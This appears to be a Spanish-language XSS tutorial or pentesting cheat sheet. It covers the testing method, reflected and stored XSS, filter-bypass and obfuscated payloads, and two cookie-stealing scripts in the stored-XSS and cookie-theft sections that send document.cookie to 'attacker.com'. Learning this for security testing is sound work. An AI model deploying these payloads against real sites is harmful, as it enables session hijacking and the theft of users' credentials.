

### Metodología

#### Los ataques de XSS utilizan principalmente lenguaje ***JavaScript***

1. **Identificar puntos de entrada**: Campos de búsqueda, comentarios, *URL parameters*
2. **Probar payloads básicos**: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
3. **Analizar el contexto**: Ver dónde se refleja el input (HTML, atributo, JavaScript)
4. **Bypassear filtros**: Si hay filtros, probar codificación, *case sensitivity*, *tags* alternativos
5. **Construir payload final**: Crear el exploit según nuestras necesidades

### XSS Reflejado (Reflected)

El script se refleja inmediatamente en la respuesta, se suelen ver en formularios por ejemplo

```html
<script>alert('XSS')</script>
```


Si se inyecta en un parámetro GET:

```html
https://ejemplo.com/search?q=<script>alert("XSS")</script>
```


***Resultado esperado***

El script se ejecuta de forma automática y vemos la respuesta al momento en nuestro navegador, y si la URL la enviamos al navegador de la víctima al hacer clic en el enlace se le ejecutará el mismo *script*.


### XSS Almacenado (Stored)

El payload se guarda en la base de datos y afecta a todos los usuarios

```html
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>
```

***Escenario común***
Comentarios, perfiles de usuario, mensajes en foros.

### Bypass de filtros XSS

```html
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

### Ofuscación de payloads

```html
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
```

### Robo de cookies

```javascript
<script>
new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```
